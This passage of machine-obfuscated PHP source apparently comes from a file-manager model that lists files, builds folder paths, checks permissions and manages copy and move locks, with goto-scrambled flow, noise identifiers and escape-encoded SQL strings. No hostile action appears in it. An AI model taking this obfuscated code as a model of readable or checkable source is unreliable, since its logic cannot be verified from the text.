"\x53\105\x4c\105\x43\124\40\52\x20\x46\122\117\x4d\40\x28\123\105\x4c\105\103\124\x20\x27{$B®ÄÀá˜½‚}\137\x68\141\x73\x46\151\154\x65\47\40\x61\163\40\150\141\163\x2c\x63\157\x75\156\164\x28\x31\x29\x20\x61\163\40\150\141\x73\103\x6f\x75\x6e\x74\40\x46\122\117\115\x20\140{$BÚšî¬ÙØ’}\140\40\xa\11\x9\11\x9\11\167\150\145\162\145\40\160\141\x72\145\x6e\164\111\104\x3d{$B®ÄÀá˜½‚}\x20\x61\x6e\144\x20\x69\163\106\157\154\144\145\162\x3d\60\40\x61\156\144\40\151\163\x44\145\x6c\x65\164\145\75{$E„¨Ã–Àªî}\51\40\141\163\40\x74\142\61\137{$B®ÄÀá˜½‚}\40\165\156\x69\x6f\x6e\x20\141\x6c\x6c\x20\xa\x9\x9\x9\x9\11\123\x45\114\105\x43\124\40\x2a\x20\106\x52\x4f\115\40\50\123\105\x4c\x45\x43\x54\40\47{$B®ÄÀá˜½‚}\x5f\150\x61\163\x46\x6f\154\144\x65\162\x27\x20\x61\163\x20\x68\x61\x73\x46\151\154\145\54\x63\x6f\165\x6e\x74\x28\x31\x29\x20\x61\x73\40\x68\141\163\103\x6f\165\156\x74\x20\106\x52\x4f\115\40\140{$BÚšî¬ÙØ’}\140\40\xa\11\11\x9\x9\11\167\150\145\x72\x65\x20\x70\x61\162\145\x6e\x74\111\104\75{$B®ÄÀá˜½‚}\40\141\x6e\x64\x20\x69\x73\x46\157\154\144\145\x72\x3d\x31\x20\141\x6e\144\x20\151\x73\104\145\x6c\145\x74\x65\75{$E„¨Ã–Àªî}\51\x20\x61\x73\40\x74\x62\x32\137{$B®ÄÀá˜½‚}\40\165\156\151\x6f\156\40\141\154\x6c\40"; } if ((strlen($e‚—º«÷Æ±) >= $E ÈñÂæÍ || $BéêÎŸŒ’ø == $Dò™ª…À¿ - 1) && $e‚—º«÷Æ±) { $e‚—º«÷Æ± = substr($e‚—º«÷Æ±, 0, -strlen($f¡öãĞĞ™[445])); $bŠ‘ëô‹ö = $this->query($e‚—º«÷Æ±); $f­±¶¾Ùè» = array_merge($f­±¶¾Ùè», $bŠ‘ëô‹ö); $e‚—º«÷Æ± = $f¡öãĞĞ™[33]; } } $f­±¶¾Ùè» = array_to_keyvalue($f­±¶¾Ùè», $f¡öãĞĞ™[446]); goto b²åÖì¤ñÛ; däî´±”å: $f¡öãĞĞ™ =& $_SERVER[Äº¡•ô™Ÿ]; $e‚—º«÷Æ± = $f¡öãĞĞ™[358]; $f­±¶¾Ùè» = array(); goto c¢‡¨ñ›Çä; Aòè‘ŒÃ §: } protected function _listAppendAuth(&$a¶Ûà â¡) { goto B‹¾Ü¿Êá; B‹¾Ü¿Êá: $FŒÒÉ‡—°ë =& $_SERVER[Äº¡•ô™Ÿ]; if (!defined($FŒÒÉ‡—°ë[423])) { return; } $cÙ›¬‡ØÔÎ = array(); goto A‡Š×ÔÉµÊ; A‡Š×ÔÉµÊ: foreach ($a¶Ûà â¡ as $BĞ¥Ã®£İ) { if ($BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[368]] == self::TYPE_GROUP) { $cÙ›¬‡ØÔÎ[] = $BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[366]]; } } if (!$cÙ›¬‡ØÔÎ) { return; } $cöù¶Şùï– = array_to_keyvalue($a¶Ûà â¡, $FŒÒÉ‡—°ë[366]); goto fĞó…°Îˆ¾; fĞó…°Îˆ¾: $FòÌõí¼Ş” = Model($FŒÒÉ‡—°ë[450])->getSourceList($cÙ›¬‡ØÔÎ, $cöù¶Şùï–); foreach ($a¶Ûà â¡ as $B‡´„­Ï«£ => &$BĞ¥Ã®£İ) { $BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[373]] = $FòÌõí¼Ş”[$BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[366]]]; if (!$BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[373]] && $BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[368]] == self::TYPE_GROUP) { $BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[373]] = Action($FŒÒÉ‡—°ë[451])->pathGroupAuthMake($BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[452]]); if (!$BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[373]] && !_get($GLOBALS, $FŒÒÉ‡—°ë[453])) { $BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[186]] = !1; $BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[185]] = !1; } } if ($BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[373]]) { $BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[186]] = AuthModel::authCheckEdit($BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[373]][$FŒÒÉ‡—°ë[374]]); $BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[185]] = AuthModel::authCheckView($BĞ¥Ã®£İ[$FŒÒÉ‡—°ë[373]][$FŒÒÉ‡—°ë[374]]); } $this->groupPathDisplay($BĞ¥Ã®£İ); } goto Bö×‰ÙòˆÍ; Bö×‰ÙòˆÍ: } public function groupPathDisplay(&$aœ¢Á¥²) { goto C®Í“¿”œ¸; AÙÎõÉä•: $aœ¢Á¥²[$DËâŒÏ¾ÇÔ[460]] = $d’Äô‡«‚º . $b²Á÷¿Î½‰[$DËâŒÏ¾ÇÔ[388]][$DËâŒÏ¾ÇÔ[366]]; goto eÍËÓÑùæÍ; cç­£ì: $EÛ÷–ù£ß¦ = $this->parentLevelArray($b²Á÷¿Î½‰[$DËâŒÏ¾ÇÔ[455]]); $d’Äô‡«‚º = $DËâŒÏ¾ÇÔ[33]; foreach ($EÛ÷–ù£ß¦ as $c»…äÃÄíÙ) { $E‘™÷×Å™ì = Model($DËâŒÏ¾ÇÔ[454])->getInfo($c»…äÃÄíÙ); $d’Äô‡«‚º .= $E‘™÷×Å™ì[$DËâŒÏ¾ÇÔ[388]][$DËâŒÏ¾ÇÔ[366]] . $DËâŒÏ¾ÇÔ[47]; } goto cŒí¿±µÌ¦; cŒí¿±µÌ¦: $aœ¢Á¥²[$DËâŒÏ¾ÇÔ[456]] = $b²Á÷¿Î½‰[$DËâŒÏ¾ÇÔ[457]]; $aœ¢Á¥²[$DËâŒÏ¾ÇÔ[377]] = $b²Á÷¿Î½‰[$DËâŒÏ¾ÇÔ[455]]; $aœ¢Á¥²[$DËâŒÏ¾ÇÔ[458]] = $b²Á÷¿Î½‰[$DËâŒÏ¾ÇÔ[459]]; goto AÙÎõÉä•; C®Í“¿”œ¸: $DËâŒÏ¾ÇÔ =& $_SERVER[Äº¡•ô™Ÿ]; if ($aœ¢Á¥²[$DËâŒÏ¾ÇÔ[368]] != self::TYPE_GROUP) { return; } $b²Á÷¿Î½‰ = Model($DËâŒÏ¾ÇÔ[454])->getInfo($aœ¢Á¥²[$DËâŒÏ¾ÇÔ[452]]); goto cç­£ì; eÍËÓÑùæÍ: } protected function _listAppendPath(&$D¥†ç˜í‚ó) { goto Bë†¯‹Ñ‰à; Bë†¯‹Ñ‰à: $eæŠ©Òçéµ =& $_SERVER[Äº¡•ô™Ÿ]; $b×øŠèÇè˜ = array(); foreach ($D¥†ç˜í‚ó as &$f©ÉºÜœŞÀ) { $b×øŠèÇè˜[$f©ÉºÜœŞÀ[$eæŠ©Òçéµ[366]]] = $f©ÉºÜœŞÀ[$eæŠ©Òçéµ[28]]; $FŠâ‹äõĞí = $this->parentLevelArray($f©ÉºÜœŞÀ[$eæŠ©Òçéµ[455]]); array_shift($FŠâ‹äõĞí); foreach ($FŠâ‹äõĞí as $c›Î“³‚²Š) { if (!isset($b×øŠèÇè˜[$c›Î“³‚²Š])) { $b×øŠèÇè˜[$c›Î“³‚²Š] = 0; } } } goto D£³…½¸ª½; A¹˜‘„Ã¨: $cğá‹¯£Å› = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($D¥†ç˜í‚ó as &$f©ÉºÜœŞÀ) { goto aÃƒ×ã¶ˆ; e®¢š¨Î©ï: if ($FŠâ‹äõĞí) { $f×÷ØÈ³Ü .= $f©ÉºÜœŞÀ[$eæŠ©Òçéµ[28]]; } if ($f©ÉºÜœŞÀ[$eæŠ©Òçéµ[367]]) { $f×÷ØÈ³Ü .= $eæŠ©Òçéµ[8]; } $f©ÉºÜœŞÀ[$eæŠ©Òçéµ[462]] = str_replace($eæŠ©Òçéµ[463], $eæŠ©Òçéµ[8], $f×÷ØÈ³Ü); goto E¥„ÊØš½Ä; aÃƒ×ã¶ˆ: $FŠâ‹äõĞí = $this->parentLevelArray($f©ÉºÜœŞÀ[$eæŠ©Òçéµ[455]]); $f×÷ØÈ³Ü = $this->_listAppendPathRoot($f©ÉºÜœŞÀ, $FŠâ‹äõĞí); foreach ($FŠâ‹äõĞí as $c›Î“³‚²Š) { if (isset($b×øŠèÇè˜[$c›Î“³‚²Š])) { $f×÷ØÈ³Ü .= $b×øŠèÇè˜[$c›Î“³‚²Š] . $eæŠ©Òçéµ[8]; } } goto e®¢š¨Î©ï; E¥„ÊØš½Ä: $aÍÃ§©½ … = trim($f©ÉºÜœŞÀ[$eæŠ©Òçéµ[462]], $eæŠ©Òçéµ[8]); if ($f©ÉºÜœŞÀ[$eæŠ©Òçéµ[457]] == $eæŠ©Òçéµ[464] && $aÍÃ§©½ …) { $f©ÉºÜœŞÀ[$eæŠ©Òçéµ[28]] = $aÍÃ§©½ …; } $this->_listAppendPathRecycle($f©ÉºÜœŞÀ, $FŠâ‹äõĞí, $cğá‹¯£Å›); goto eª”•…Ù÷ù; eª”•…Ù÷ù: } goto Eª®ÙõëÆÑ; D£³…½¸ª½: $CïŸİ­¶°† = array(); foreach ($b×øŠèÇè˜ as $f¾©Î»İ„ => $A¤ò– „ù‹) { if (!$A¤ò– „ù‹) { $CïŸİ­¶°†[] = $f¾©Î»İ„; } } if ($CïŸİ­¶°†) { $aÏ§Ô«”£ = array($eæŠ©Òçéµ[380] => array($eæŠ©Òçéµ[381], $CïŸİ­¶°†)); if (count($CïŸİ­¶°†) == 1) { $fÀ¡‘áÍìâ = $this->sourceInfo($CïŸİ­¶°†[0]); $fÀ¡‘áÍìâ = is_array($fÀ¡‘áÍìâ) ? array($fÀ¡‘áÍìâ) : !1; } else { $fÀ¡‘áÍìâ = $this->field($eæŠ©Òçéµ[461])->where($aÏ§Ô«”£)->select(); } $BàÎ·´•™é = array_to_keyvalue($fÀ¡‘áÍìâ, $eæŠ©Òçéµ[366], $eæŠ©Òçéµ[28]); $b×øŠèÇè˜ = array_merge_index($b×øŠèÇè˜, $BàÎ·´•™é); } goto A¹˜‘„Ã¨; Eª®ÙõëÆÑ: } private function _listAppendPathRecycle(&$e£ÏíèÊñ, $bÖ…›Ì®¨‹, $d±åØùğÈ) { goto FãÌ¢ºŸ; FãÌ¢ºŸ: $eºæ¦‡»‹Ö =& $_SERVER[Äº¡•ô™Ÿ]; if (intval($e£ÏíèÊñ[$eºæ¦‡»‹Ö[368]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($d±åØùğÈ, $bÖ…›Ì®¨‹) && $e£ÏíèÊñ[$eºæ¦‡»‹Ö[366]] != $d±åØùğÈ) { return; } goto bŠÚ„¤½”³; aİ¶ˆ†Ê—¹: $e£ÏíèÊñ[$eºæ¦‡»‹Ö[455]] = $eºæ¦‡»‹Ö[466] . implode($eºæ¦‡»‹Ö[47], array_slice($bÖ…›Ì®¨‹, 1)) . $eºæ¦‡»‹Ö[47]; if ($e£ÏíèÊñ[$eºæ¦‡»‹Ö[366]] == $d±åØùğÈ) { $e£ÏíèÊñ[$eºæ¦‡»‹Ö[455]] = $eºæ¦‡»‹Ö[466]; $e£ÏíèÊñ[$eºæ¦‡»‹Ö[457]] = $eºæ¦‡»‹Ö[464]; $e£ÏíèÊñ[$eºæ¦‡»‹Ö[28]] = LNG($eºæ¦‡»‹Ö[465]); } $e£ÏíèÊñ[$eºæ¦‡»‹Ö[467]] = $eºæ¦‡»‹Ö[468]; goto eïÓ¥ÛÛŠ–; bŠÚ„¤½”³: $bŒ¿äêŞ = explode($eºæ¦‡»‹Ö[8], trim($e£ÏíèÊñ[$eºæ¦‡»‹Ö[462]], $eºæ¦‡»‹Ö[8])); $BÁÄ¡ÚÚ¾ô = implode($eºæ¦‡»‹Ö[8], array_slice($bŒ¿äêŞ, 2)); $e£ÏíèÊñ[$eºæ¦‡»‹Ö[462]] = $eºæ¦‡»‹Ö[8] . LNG($eºæ¦‡»‹Ö[465]) . $eºæ¦‡»‹Ö[8] . ltrim($BÁÄ¡ÚÚ¾ô, $eºæ¦‡»‹Ö[8]); goto aİ¶ˆ†Ê—¹; eïÓ¥ÛÛŠ–: } protected function _listAppendPathRoot(&$B¯÷„Ûñğé, $f¶‚Ó°µß—) { $cùÖˆÖ–Ê• =& $_SERVER[Äº¡•ô™Ÿ]; $Aæ½º¦ŠŸ = $cùÖˆÖ–Ê•[33]; if ($B¯÷„Ûñğé[$cùÖˆÖ–Ê•[368]] == self::TYPE_USER) { if (defined($cùÖˆÖ–Ê•[423]) && $B¯÷„Ûñğé[$cùÖˆÖ–Ê•[452]] == USER_ID) { $Aæ½º¦ŠŸ = LNG($cùÖˆÖ–Ê•[469]); if (!$f¶‚Ó°µß—) { $B¯÷„Ûñğé[$cùÖˆÖ–Ê•[28]] = $Aæ½º¦ŠŸ; } } else { $dœİÅÆí¢ = Model($cùÖˆÖ–Ê•[470])->getInfoSimple($B¯÷„Ûñğé[$cùÖˆÖ–Ê•[452]]); $Aæ½º¦ŠŸ = LNG($cùÖˆÖ–Ê•[471]) . $cùÖˆÖ–Ê•[154] . $dœİÅÆí¢[$cùÖˆÖ–Ê•[28]] . $cùÖˆÖ–Ê•[472]; } } else { if ($B¯÷„Ûñğé[$cùÖˆÖ–Ê•[368]] == self::TYPE_GROUP) { $dœİÅÆí¢ = Model($cùÖˆÖ–Ê•[454])->getInfoSimple($B¯÷„Ûñğé[$cùÖˆÖ–Ê•[452]]); $Aæ½º¦ŠŸ = $dœİÅÆí¢[$cùÖˆÖ–Ê•[28]]; } else { if ($B¯÷„Ûñğé[$cùÖˆÖ–Ê•[368]] == self::TYPE_SYSTEM) { $dœİÅÆí¢ = $this->sourceInfo($f¶‚Ó°µß—[0], !0); $Aæ½º¦ŠŸ = $dœİÅÆí¢[$cùÖˆÖ–Ê•[28]]; } } } $Aæ½º¦ŠŸ = $Aæ½º¦ŠŸ ? $cùÖˆÖ–Ê•[8] . $Aæ½º¦ŠŸ . $cùÖˆÖ–Ê•[8] : $cùÖˆÖ–Ê•[8]; return $Aæ½º¦ŠŸ; } protected function _listAppendUser(&$fÑ…Èá¨¦ß) { $d‘ò¼ÒÇª =& $_SERVER[Äº¡•ô™Ÿ]; $AëÖÖ˜‰ = array_to_keyvalue($fÑ…Èá¨¦ß, $d‘ò¼ÒÇª[33], $d‘ò¼ÒÇª[375]); $a¥‹Ÿª¨Ğ = array_to_keyvalue($fÑ…Èá¨¦ß, $d‘ò¼ÒÇª[33], $d‘ò¼ÒÇª[376]); $a†ËÂ¡ïê = array_merge($AëÖÖ˜‰, $a¥‹Ÿª¨Ğ); $cˆ—›±®¥ = Model($d‘ò¼ÒÇª[473])->userListInfo($a†ËÂ¡ïê); foreach ($fÑ…Èá¨¦ß as &$FËºÂ…ã«„) { $dê‡Şçç› = $FËºÂ…ã«„[$d‘ò¼ÒÇª[375]]; $FËºÂ…ã«„[$d‘ò¼ÒÇª[375]] = $cˆ—›±®¥[$dê‡Şçç›] ? $cˆ—›±®¥[$dê‡Şçç›] : !1; $dê‡Şçç› = $FËºÂ…ã«„[$d‘ò¼ÒÇª[376]]; $FËºÂ…ã«„[$d‘ò¼ÒÇª[376]] = $cˆ—›±®¥[$dê‡Şçç›] ? $cˆ—›±®¥[$dê‡Şçç›] : !1; if (isset($FËºÂ…ã«„[$d‘ò¼ÒÇª[413]]) && $FËºÂ…ã«„[$d‘ò¼ÒÇª[413]][$d‘ò¼ÒÇª[474]]) { $E´Æš•’„Ó = $GLOBALS[$d‘ò¼ÒÇª[6]][$d‘ò¼ÒÇª[84]][$d‘ò¼ÒÇª[475]]; if ($FËºÂ…ã«„[$d‘ò¼ÒÇª[413]][$d‘ò¼ÒÇª[476]] <= time() - $E´Æš•’„Ó) { $this->metaSet($FËºÂ…ã«„[$d‘ò¼ÒÇª[366]], $d‘ò¼ÒÇª[474], null); $this->metaSet($FËºÂ…ã«„[$d‘ò¼ÒÇª[366]], $d‘ò¼ÒÇª[476], null); unset($FËºÂ…ã«„[$d‘ò¼ÒÇª[413]][$d‘ò¼ÒÇª[474]]); continue; } $F§‰ìãåãã = $FËºÂ…ã«„[$d‘ò¼ÒÇª[413]][$d‘ò¼ÒÇª[474]]; $FËºÂ…ã«„[$d‘ò¼ÒÇª[413]][$d‘ò¼ÒÇª[477]] = Model($d‘ò¼ÒÇª[473])->getInfoSimpleOuter($F§‰ìãåãã); } } } public function parentLevelArray($a¸Ø£¸ÔòÑ) { $EºŠ‹é‰ø² =& $_SERVER[Äº¡•ô™Ÿ]; $a¸Ø£¸ÔòÑ = explode($EºŠ‹é‰ø²[47], trim($a¸Ø£¸ÔòÑ, $EºŠ‹é‰ø²[47])); return array_remove_value($a¸Ø£¸ÔòÑ, $EºŠ‹é‰ø²[464]); } public function listAll($bÇ«é­ä„¢) { goto D…¨Î—Õµ‚; c¨ìé“Ç: $this->_listAppendAuth($FñŒŠº§); $this->_listAppendUser($FñŒŠº§); $this->_listAppendPath($FñŒŠº§); goto C²¹×İ†; C²¹×İ†: $FñŒŠº§ = array_to_keyvalue($FñŒŠº§, $cÓŠ‡‚‡ØÈ[366]); $Cñç¼¡ÉÇ¿ = "\57{$EÄ©èì„¦¢[$cÓŠ‡‚‡ØÈ[28]]}\x2f"; $Cñç¼¡ÉÇ¿ = $Cñç¼¡ÉÇ¿ == $cÓŠ‡‚‡ØÈ[463] ? $cÓŠ‡‚‡ØÈ[8] : $Cñç¼¡ÉÇ¿; goto a“¹ÛÈãÖË; D…¨Î—Õµ‚: $cÓŠ‡‚‡ØÈ =& $_SERVER[Äº¡•ô™Ÿ]; $EÄ©èì„¦¢ = $this->sourceInfo($bÇ«é­ä„¢); $eéÒ¢«¬Å‹ = array($cÓŠ‡‚‡ØÈ[478] => array($cÓŠ‡‚‡ØÈ[479], $EÄ©èì„¦¢[$cÓŠ‡‚‡ØÈ[455]] . $bÇ«é­ä„¢ . $cÓŠ‡‚‡ØÈ[480]), $cÓŠ‡‚‡ØÈ[481] => 0); goto Fá‘ËÂ³ä; a“¹ÛÈãÖË: $FÓîÕ‡‰Áó = array(); foreach ($FñŒŠº§ as $Dò¦¥Šµæ => $EËÁˆ²×µ) { goto C¥Õ¬§ÁÓ‰; C¥Õ¬§ÁÓ‰: $B³©àãº„Š = $this->parentLevelArray($EËÁˆ²×µ[$cÓŠ‡‚‡ØÈ[455]]); array_shift($B³©àãº„Š); $e»ŸÖŠ…Ğ = $Cñç¼¡ÉÇ¿; goto F¦¸âÍÊ»; F¦¸âÍÊ»: for ($aÒŸÖ‡·Í„ = 0; $aÒŸÖ‡·Í„ < count($B³©àãº„Š); $aÒŸÖ‡·Í„++) { $e»ŸÖŠ…Ğ .= $FñŒŠº§[$B³©àãº„Š[$aÒŸÖ‡·Í„]][$cÓŠ‡‚‡ØÈ[28]] . $cÓŠ‡‚‡ØÈ[8]; } $e»ŸÖŠ…Ğ .= $EËÁˆ²×µ[$cÓŠ‡‚‡ØÈ[28]]; if ($EËÁˆ²×µ[$cÓŠ‡‚‡ØÈ[367]]) { $e»ŸÖŠ…Ğ .= $cÓŠ‡‚‡ØÈ[8]; } goto DÌìŠ‰àİ£; DÌìŠ‰àİ£: $e»ŸÖŠ…Ğ = str_replace($cÓŠ‡‚‡ØÈ[463], $cÓŠ‡‚‡ØÈ[8], $e»ŸÖŠ…Ğ); $e»ŸÖŠ…Ğ = str_replace($cÓŠ‡‚‡ØÈ[463], $cÓŠ‡‚‡ØÈ[8], $e»ŸÖŠ…Ğ); $aŒÑ¤ùÜÌì = array($cÓŠ‡‚‡ØÈ[384] => str_replace($cÓŠ‡‚‡ØÈ[463], $cÓŠ‡‚‡ØÈ[8], $e»ŸÖŠ…Ğ), $cÓŠ‡‚‡ØÈ[484] => intval($EËÁˆ²×µ[$cÓŠ‡‚‡ØÈ[367]]), $cÓŠ‡‚‡ØÈ[388] => $this->pathInfoFilter($EËÁˆ²×µ, !0)); goto aÒËœÑ ¤; aÒËœÑ ¤: if (!$EËÁˆ²×µ[$cÓŠ‡‚‡ØÈ[367]]) { $aŒÑ¤ùÜÌì[$cÓŠ‡‚‡ØÈ[415]] = $EËÁˆ²×µ[$cÓŠ‡‚‡ØÈ[415]]; $aŒÑ¤ùÜÌì[$cÓŠ‡‚‡ØÈ[485]] = $EËÁˆ²×µ[$cÓŠ‡‚‡ØÈ[75]]; } $FÓîÕ‡‰Áó[] = $aŒÑ¤ùÜÌì; goto bí†ØÈéšÄ; bí†ØÈéšÄ: } return $FÓîÕ‡‰Áó; goto dÁõ¨˜’–˜; Fá‘ËÂ³ä: $bâ±šâã†ğ = $cÓŠ‡‚‡ØÈ[482]; $e™¿Ø‹§Œå = "\114\105\106\x54\x20\112\117\x49\116\x20{$this->tablePrefix}\151\x6f\137\x66\151\x6c\145\x20\146\x69\154\145\x20\157\156\x20\163\157\x75\x72\x63\x65\x2e\146\151\x6c\145\111\x44\x20\75\40\x66\x69\154\145\x2e\146\151\154\145\x49\x44"; $FñŒŠº§ = $this->alias($cÓŠ‡‚‡ØÈ[483])->field($bâ±šâã†ğ)->where($eéÒ¢«¬Å‹)->join($e™¿Ø‹§Œå)->select(); goto c¨ìé“Ç; dÁõ¨˜’–˜: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($fá²—Êí¾‚) { goto cçìİÁç‹”; cçìİÁç‹”: $Dâó®ë™— =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Dâó®ë™—[486], $fá²—Êí¾‚); goto aî‹³ƒŠ«Ù; aî‹³ƒŠ«Ù: $bŒƒÊ·“ƒ = 1; $this->_lockEvent($fá²—Êí¾‚, array($Dâó®ë™—[487], $Dâó®ë™—[488]), $bŒƒÊ·“ƒ); $this->_lockParent($fá²—Êí¾‚, array($Dâó®ë™—[488]), $bŒƒÊ·“ƒ); goto dŸİßŸ¯È; dŸİßŸ¯È: $this->_lockEvent($fá²—Êí¾‚, array($Dâó®ë™—[489], $Dâó®ë™—[490]), $bŒƒÊ·“ƒ); $this->_lockCheckEnd($Dâó®ë™—[486], $fá²—Êí¾‚); goto DŞÍ½–Æ§; DŞÍ½–Æ§: } public function lockCopyEnd($cÇŸ©´˜) { $CÇÜˆÕïÛ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->allowLock()) { return; } $Cî–áÒ›ñ” = 0; $this->_lockEvent($cÇŸ©´˜, array($CÇÜˆÕïÛ[487], $CÇÜˆÕïÛ[488]), $Cî–áÒ›ñ”); $this->_lockParent($cÇŸ©´˜, array($CÇÜˆÕïÛ[488]), $Cî–áÒ›ñ”); $this->_lockEvent($cÇŸ©´˜, array($CÇÜˆÕïÛ[489], $CÇÜˆÕïÛ[490]), $Cî–áÒ›ñ”); } public function lockWriteStart($F×ŞÛªÁ‹¨, $Bª°îİ›¼ = '') { goto F¹Ç”¤›‘¢; EÎÔ™’âÚğ: $f‘–™’ÛÍ• = 1; $this->_lockKey($CªŸÀ•¡¸ô[491] . $F×ŞÛªÁ‹¨ . $CªŸÀ•¡¸ô[93] . $Bª°îİ›¼, $f‘–™’ÛÍ•); $this->_lockEvent($F×ŞÛªÁ‹¨, array($CªŸÀ•¡¸ô[486], $CªŸÀ•¡¸ô[488]), $f‘–™’ÛÍ•); goto aØğ¡•™‘×; F¹Ç”¤›‘¢: $CªŸÀ•¡¸ô =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->allowLock()) { return; } $this->_lockCheck($CªŸÀ•¡¸ô[487], $F×ŞÛªÁ‹¨); goto EÎÔ™’âÚğ; aØğ¡•™‘×: $this->_lockParent($F×ŞÛªÁ‹¨, array($CªŸÀ•¡¸ô[486], $CªŸÀ•¡¸ô[488]), $f‘–™’ÛÍ•); $this->_lockCheckEnd($CªŸÀ•¡¸ô[487], $F×ŞÛªÁ‹¨); goto bš­Ë˜á†; bš­Ë˜á†: } public function lockWriteEnd($e¡ÊøÃŸ¿Ï, $DƒÏØÓÊÜ– = '') { $eÚëç…ç…İ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->allowLock()) { return; } $e‰¢½¯Ì™” = 0; $this->_lockKey($eÚëç…ç…İ[491] . $e¡ÊøÃŸ¿Ï . $eÚëç…ç…İ[93] . $DƒÏØÓÊÜ–, $e‰¢½¯Ì™”); $this->_lockEvent($e¡ÊøÃŸ¿Ï, array($eÚëç…ç…İ[486], $eÚëç…ç…İ[488]), $e‰¢½¯Ì™”); $this->_lockParent($e¡ÊøÃŸ¿Ï, array($eÚëç…ç…İ[486], $eÚëç…ç…İ[488]), $e‰¢½¯Ì™”); } public function lockMoveStart($Eæ„ÃĞåî…) { goto Fëäğ¹ƒ; Fëäğ¹ƒ: $D¯¶ç†éÈÜ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->allowLock()) { return; } $this->_lockCheck($D¯¶ç†éÈÜ[488], $Eæ„ÃĞåî…); goto aƒš‹ã„ê; aƒš‹ã„ê: $dñÚáª®õÒ = 1; $this->_lockKey($D¯¶ç†éÈÜ[492] . $Eæ„ÃĞåî…, $dñÚáª®õÒ); $this->_lockEvent($Eæ„ÃĞåî…, array($D¯¶ç†éÈÜ[486], $D¯¶ç†éÈÜ[487]), $dñÚáª®õÒ); goto Eµ©ÊŠîÀİ; Eµ©ÊŠîÀİ: $this->_lockParent($Eæ„ÃĞåî…, array($D¯¶ç†éÈÜ[486], $D¯¶ç†éÈÜ[488]), $dñÚáª®õÒ); $this->_lockEvent($Eæ„ÃĞåî…, array($D¯¶ç†éÈÜ[493], $D¯¶ç†éÈÜ[489], $D¯¶ç†éÈÜ[490]), $dñÚáª®õÒ); $this->_lockCheckEnd($D¯¶ç†éÈÜ[488], $Eæ„ÃĞåî…); goto E¨ŞÉŒ«®©; E¨ŞÉŒ«®©: } public function lockMoveEnd($aî˜¨õ’ïÒ) { goto c¡Á£½Ì®›; C˜šÕ•è÷: $this->_lockKey($D‰‰˜×¸‰İ[492] . $aî˜¨õ’ïÒ, $DãÆå«êˆ¤); $this->_lockEvent($aî˜¨õ’ïÒ, array($D‰‰˜×¸‰İ[486], $D‰‰˜×¸‰İ[487]), $DãÆå«êˆ¤); $this->_lockParent($aî˜¨õ’ïÒ, array($D‰‰˜×¸‰İ[486], $D‰‰˜×¸‰İ[488]), $DãÆå«êˆ¤); goto F¼‰¦×½¹ˆ; c¡Á£½Ì®›: $D‰‰˜×¸‰İ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->allowLock()) { return; } $DãÆå«êˆ¤ = 0; goto C˜šÕ•è÷; F¼‰¦×½¹ˆ: $this->_lockEvent($aî˜¨õ’ïÒ, array($D‰‰˜×¸‰İ[493], $D‰‰˜×¸‰İ[489], $D‰‰˜×¸‰İ[490]), $DãÆå«êˆ¤); goto fÆ®òãÈº; fÆ®òãÈº: } private function _lockCheck($eÊ¦°˜õÄ°, $E¦ê×ŠÛ¼å) { goto b‘äªè¯ØÜ; b››½ŸÉÁ: CacheLock::setErrorMsg($e¤‹Âº‹êÇ[154] . htmlspecialchars($aæè¼¯‘‹È[$e¤‹Âº‹êÇ[28]]) . $e¤‹Âº‹êÇ[472] . $C‡Ë™¿çòÕ); $this->_lockKey($bå» ºƒ«, 1); $this->_lockKey($bå» ºƒ«, 0); goto FõµœˆÀ¨; b‘äªè¯ØÜ: $e¤‹Âº‹êÇ =& $_SERVER[Äº¡•ô™Ÿ]; $aæè¼¯‘‹È = $this->sourceInfo($E¦ê×ŠÛ¼å); $bå» ºƒ« = $eÊ¦°˜õÄ° . $e¤‹Âº‹êÇ[93] . $E¦ê×ŠÛ¼å; goto C²á‚•í°Ç; FõµœˆÀ¨: $FµŠ²ŞïŒç = array_reverse($this->parentLevelArray($aæè¼¯‘‹È[$e¤‹Âº‹êÇ[455]])); foreach ($FµŠ²ŞïŒç as $E’ò¼³”™) { $bå» ºƒ« = $eÊ¦°˜õÄ° . $e¤‹Âº‹êÇ[495] . $E’ò¼³”™; if (CacheLock::lockGet($e¤‹Âº‹êÇ[496] . $bå» ºƒ«)) { $aæè¼¯‘‹È = $this->sourceInfo($E’ò¼³”™); CacheLock::setErrorMsg($e¤‹Âº‹êÇ[154] . htmlspecialchars($aæè¼¯‘‹È[$e¤‹Âº‹êÇ[28]]) . $e¤‹Âº‹êÇ[472] . $C‡Ë™¿çòÕ); $this->_lockKey($bå» ºƒ«, 1); $this->_lockKey($bå» ºƒ«, 0); } } goto e†š¯†¬Ùî; C²á‚•í°Ç: $this->_lockTimeStart[$bå» ºƒ«] = timeFloat(); if (!is_array($aæè¼¯‘‹È)) { return; } $C‡Ë™¿çòÕ = LNG($e¤‹Âº‹êÇ[494]); goto b››½ŸÉÁ; e†š¯†¬Ùî: } private function _lockCheckEnd($C¸‘ŞãÖ”, $BÁ»ÑÓ¶…) { goto bø‘ğÌƒ£; bø‘ğÌƒ£: $DÌ°Û«¾Ä =& $_SERVER[Äº¡•ô™Ÿ]; $bŸÉ¸¿¥—„ = $C¸‘ŞãÖ” . $DÌ°Û«¾Ä[93] . $BÁ»ÑÓ¶…; 